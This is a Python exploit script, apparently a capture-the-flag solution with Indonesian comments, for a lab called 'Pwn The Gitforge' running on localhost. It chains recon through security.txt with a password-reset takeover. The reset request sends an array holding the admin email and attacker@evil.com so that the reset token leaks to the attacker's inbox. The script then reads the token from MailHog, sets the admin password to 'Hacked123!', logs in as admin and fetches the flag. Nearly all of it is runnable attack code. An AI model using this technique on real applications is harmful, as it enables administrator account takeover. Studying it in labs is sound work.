#!/usr/bin/env python3
#!/usr/bin/env python3
import requests
import re
import time

BASE_URL = "http://localhost:1337"
MAILHOG_URL = "http://localhost:8025"
SESSION = requests.Session()

def get_admin_email():
    print("[*] Step 1: Recon - Cek security.txt untuk email...")
    r = requests.get(f"{BASE_URL}/.well-known/security.txt")
    print(r.text)
    match = re.search(r'mailto:(\S+)', r.text)
    if match:
        email = match.group(1)
        print(f"[+] Email dari security.txt: {email}")
        return email
    return None

def get_reset_emails():
    print("[*] Step 2: Cek MailHog untuk semua email yang ada...")
    r = requests.get(f"{MAILHOG_URL}/api/v2/messages")
    data = r.json()
    print(f"[+] Total email di mailbox: {data.get('total', 0)}")
    for msg in data.get('items', []):
        print(f"    To: {msg['Raw']['To']}")
    return data

def trigger_password_reset(admin_email, attacker_email="attacker@evil.com"):
    print(f"\n[*] Step 3: Trigger password reset - admin={admin_email}, attacker={attacker_email}")
    
    # Kirim array email: admin dulu (jadi target_user = admin)
    # tapi token juga dikirim ke email kita
    data = {
        "authenticity_token": "dummy_csrf_token_for_lab_xxxxxxxxxx",
        "user[email][]": [admin_email, attacker_email]
    }
    
    r = SESSION.post(f"{BASE_URL}/users/password", data=data)
    print(f"[+] Reset request status: {r.status_code} | URL: {r.url}")
    return r

def get_reset_token_from_mailhog(attacker_email):
    print(f"\n[*] Step 4: Ambil reset token dari MailHog...")
    time.sleep(1)
    
    r = requests.get(f"{MAILHOG_URL}/api/v2/messages")
    data = r.json()
    
    token = None
    for msg in data.get('items', []):
        to_list = msg['Raw']['To']
        body = msg['Content']['Body']
        
        # Cari email yang ke attacker atau admin
        print(f"    Email to: {to_list}")
        match = re.search(r'reset_password_token=([A-Za-z0-9_-]+)', body)
        if match:
            token = match.group(1)
            print(f"[+] Token ditemukan: {token}")
            break
    
    return token

def reset_admin_password(token, new_password="Hacked123!"):
    print(f"\n[*] Step 5: Reset password admin dengan token...")
    
    # Ambil CSRF token dari form
    r = SESSION.get(f"{BASE_URL}/users/password/edit?reset_password_token={token}")
    csrf_match = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
    csrf = csrf_match.group(1) if csrf_match else "x" * 32
    
    data = {
        "authenticity_token": csrf,
        "user[reset_password_token]": token,
        "user[password]": new_password,
        "user[password_confirmation]": new_password,
        "_method": "put"
    }
    
    r = SESSION.post(f"{BASE_URL}/users/password", data=data)
    print(f"[+] Reset status: {r.status_code} | URL: {r.url}")
    return r

def login_as_admin(admin_email, password="Hacked123!"):
    print(f"\n[*] Step 6: Login sebagai admin...")
    
    data = {
        "user[login]": admin_email,
        "user[password]": password
    }
    
    r = SESSION.post(f"{BASE_URL}/users/sign_in", data=data)
    print(f"[+] Login status: {r.status_code} | URL: {r.url}")
    return r

def get_flag():
    print(f"\n[*] Step 7: Ambil flag dari dashboard...")
    r = SESSION.get(f"{BASE_URL}/dashboard")
    
    # Cari flag
    match = re.search(r'pwn\{[^}]+\}', r.text)
    if match:
        print(f"\n{'='*50}")
        print(f"[+] FLAG: {match.group(0)}")
        print(f"{'='*50}")
    else:
        # Print sebagian dashboard untuk debug
        print("[-] Flag tidak ditemukan, print dashboard:")
        print(r.text[:500])
    
    return r

def main():
    print("="*50)
    print("  Pwn The Gitforge - Full Chain Exploit")
    print("="*50)
    print(f"[*] Target: {BASE_URL}\n")

    # Step 1: Recon
    victim_email = get_admin_email()  # security.txt bocorkan email
    
    # Admin email dari source code default
    admin_email = "admin@gitforge.local"
    attacker_email = "attacker@evil.com"
    
    print(f"\n[*] Target admin email: {admin_email}")
    
    # Step 2: Cek mailhog existing
    get_reset_emails()
    
    # Step 3: Trigger exploit - array email
    trigger_password_reset(admin_email, attacker_email)
    
    # Step 4: Ambil token dari mailhog
    token = get_reset_token_from_mailhog(attacker_email)
    
    if not token:
        print("[-] Token tidak ditemukan di mailhog!")
        print("[*] Coba cek manual: http://localhost:8025")
        return
    
    # Step 5: Reset password admin
    reset_admin_password(token, "Hacked123!")
    
    # Step 6: Login
    login_as_admin(admin_email, "Hacked123!")
    
    # Step 7: Get flag
    get_flag()
    
    print("\n[*] Done!")

if __name__ == "__main__":
    main()
